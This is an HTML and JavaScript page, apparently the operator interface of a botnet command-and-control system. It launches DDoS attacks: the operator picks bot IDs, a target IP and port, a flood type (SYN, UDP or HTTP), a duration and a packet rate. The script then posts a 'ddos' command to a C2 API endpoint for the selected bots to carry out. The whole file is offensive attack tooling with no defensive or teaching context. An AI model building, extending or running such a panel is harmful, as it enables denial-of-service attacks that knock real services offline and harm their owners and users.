<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DDoS Control</title>
    <link rel="stylesheet" href="../GUI-style.css">
</head>
<body>
    <h1>DDoS Attack</h1>
    <div class="panel">
        <h2>Parameters</h2>
        <input type="text" id="targets" placeholder="Target bot IDs (comma separated)">
        <input type="text" id="target" placeholder="Target IP">
        <input type="number" id="port" placeholder="Port">
        <select id="method">
            <option value="syn-flood">SYN Flood</option>
            <option value="udp-flood">UDP Flood</option>
            <option value="http-flood">HTTP Flood</option>
        </select>
        <input type="number" id="duration" placeholder="Duration (seconds)">
        <input type="number" id="pps" placeholder="Packets Per Second">
        <button onclick="startDdosAttack()">Start Attack</button>
    </div>
    <div class="panel">
        <h2>Output</h2>
        <div id="output"></div>
    </div>
    <div id="popup" class="popup hidden">
        <div class="popup-content">
            <p id="popup-message"></p>
            <button onclick="closePopup()">Close</button>
        </div>
    </div>
    <div id="run-popup" class="popup hidden">
        <div class="popup-content">
            <h3>Prepare to Run</h3>
            <p id="run-popup-message"></p>
            <p id="run-popup-feedback"></p>
            <button onclick="triggerRunFromPopup()">Run</button>
            <button onclick="closeRunPopup()">Cancel</button>
        </div>
    </div>
    <script>
        const popup = document.getElementById('popup');
        const popupMessage = document.getElementById('popup-message');
        const runPopup = document.getElementById('run-popup');
        const runPopupMessage = document.getElementById('run-popup-message');
        const runPopupFeedback = document.getElementById('run-popup-feedback');
        let pendingRunAction = null;

        function showPopup(message, isError = false) {
            popupMessage.textContent = message;
            popup.classList.remove('hidden');
            popup.classList.toggle('error', isError);
        }

        function closePopup() {
            popup.classList.add('hidden');
            popup.classList.remove('error');
        }

        function openRunPopup(message, action) {
            pendingRunAction = action;
            runPopupMessage.textContent = message || 'Click Run to execute this command.';
            runPopupFeedback.textContent = '';
            runPopup.classList.remove('hidden');
        }

        function closeRunPopup() {
            runPopup.classList.add('hidden');
            pendingRunAction = null;
        }

        function triggerRunFromPopup() {
            if (typeof pendingRunAction === 'function') {
                const timestamp = new Date().toLocaleTimeString();
                runPopupFeedback.textContent = 'Run button clicked at ' + timestamp + '.';
                alert('Run button clicked at ' + timestamp + '.');
                const action = pendingRunAction;
                closeRunPopup();
                action();
            }
        }

        function startDdosAttack() {
            openRunPopup('Ready to launch the DDoS attack.', execute);
        }

        function buildCommand(params) {
            return JSON.stringify({ module: 'ddos', params });
        }

        function execute() {
            const targetsRaw = document.getElementById('targets').value.trim();
            const targets = targetsRaw.split(',').map(v => v.trim()).filter(Boolean);
            if (!targets.length) {
                showPopup('Please specify at least one target bot ID.', true);
                return;
            }
            const params = {
                target: document.getElementById('target').value,
                port: parseInt(document.getElementById('port').value, 10),
                method: document.getElementById('method').value,
                duration: parseInt(document.getElementById('duration').value, 10),
                pps: parseInt(document.getElementById('pps').value, 10)
            };
            if (!params.target || Number.isNaN(params.port) || Number.isNaN(params.duration) || Number.isNaN(params.pps)) {
                showPopup('Please provide valid target, port, duration, and PPS values.', true);
                return;
            }
            fetch('/api/c2/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    targets,
                    command: buildCommand(params)
                })
            })
            .then(res => res.json())
            .then(data => {
                if (data.status === 'ok') {
                    showPopup('DDoS command queued for ' + targets.join(', '));
                } else {
                    showPopup('C2 rejected command: ' + (data.message || 'unknown error'), true);
                }
            })
            .catch(err => {
                showPopup('Failed to send command: ' + err, true);
            });
        }
    </script>
</body>
</html>
